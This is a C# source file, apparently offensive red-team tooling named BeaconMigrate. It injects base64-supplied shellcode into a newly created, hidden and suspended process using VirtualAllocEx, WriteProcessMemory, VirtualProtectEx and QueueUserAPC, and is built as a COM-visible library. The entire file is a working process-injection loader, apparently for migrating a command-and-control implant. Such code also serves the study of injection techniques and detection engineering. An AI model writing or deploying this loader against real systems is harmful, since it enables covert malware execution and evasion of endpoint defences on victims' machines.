using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

//C:\Windows\Microsoft.Net\Framework\v2.0.50727\csc.exe /target:library BeaconMigrate.cs
//
[ComVisible(true)]
public class TestClass
{

	public TestClass()
	{
		
	}
	
	public void Migrate(string x86, string x64, string processpath)
	{
		string s;
		
		if(IntPtr.Size == 4)
		{
			s = x86;
		}
		else
		{
			s = x64;
		}
		
		byte[] shellcode = Convert.FromBase64String(s);
		
		STARTUPINFO si = new STARTUPINFO();
		PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
		bool success = CreateProcess(processpath, null, 
		    IntPtr.Zero, IntPtr.Zero, false, 
		    ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW , 
		    IntPtr.Zero, null, ref si, out pi);
		
		
		IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);
		IntPtr bytesWritten = IntPtr.Zero;
		bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);
		uint oldProtect = 0;
		
		resultBool = VirtualProtectEx(pi.hProcess, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect );
		
		Process targetProc = Process.GetProcessById((int)pi.dwProcessId);
		ProcessThreadCollection currentThreads = targetProc.Threads;
		IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, currentThreads[0].Id);
	
		IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);
		
		IntPtr ThreadHandle = pi.hThread;
		ResumeThread(ThreadHandle);
		
		
	}
		
		private static UInt32 MEM_COMMIT = 0x1000;
		private static UInt32 PAGE_EXECUTE_READ = 0x20;
		private static UInt32 PAGE_READWRITE = 0x04;
		
		

		//QueueUserAPC Helpers

		[Flags]
		public enum ProcessAccessFlags : uint
		{
			All = 0x001F0FFF,
			Terminate = 0x00000001,
			CreateThread = 0x00000002,
			VirtualMemoryOperation = 0x00000008,
			VirtualMemoryRead = 0x00000010,
			VirtualMemoryWrite = 0x00000020,
			DuplicateHandle = 0x00000040,
			CreateProcess = 0x000000080,
			SetQuota = 0x00000100,
			SetInformation = 0x00000200,
			QueryInformation = 0x00000400,
			QueryLimitedInformation = 0x00001000,
			Synchronize = 0x00100000
		}
		
		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public uint dwProcessId;
			public uint dwThreadId;
		}

		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}
		
		[Flags]
		public enum    ThreadAccess : int
		{
			TERMINATE           = (0x0001)  ,
			SUSPEND_RESUME      = (0x0002)  ,
			GET_CONTEXT         = (0x0008)  ,
			SET_CONTEXT         = (0x0010)  ,
			SET_INFORMATION     = (0x0020)  ,
			QUERY_INFORMATION       = (0x0040)  ,
			SET_THREAD_TOKEN    = (0x0080)  ,
			IMPERSONATE         = (0x0100)  ,
			DIRECT_IMPERSONATION    = (0x0200)
		}
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
			int dwThreadId);

		
		[DllImport("kernel32.dll",SetLastError = true)]
		public static extern bool WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			byte[] lpBuffer,
			int nSize,
			out IntPtr lpNumberOfBytesWritten);
		
		[DllImport("kernel32.dll")]
		public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
		
		[DllImport("kernel32.dll", SetLastError = true )]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
		Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
		   int dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll")]
		public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
								 bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
								string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("kernel32.dll")]
		public static extern uint ResumeThread(IntPtr hThread);

		[DllImport("kernel32.dll")]
		public static extern uint SuspendThread(IntPtr hThread);
		
		
}
	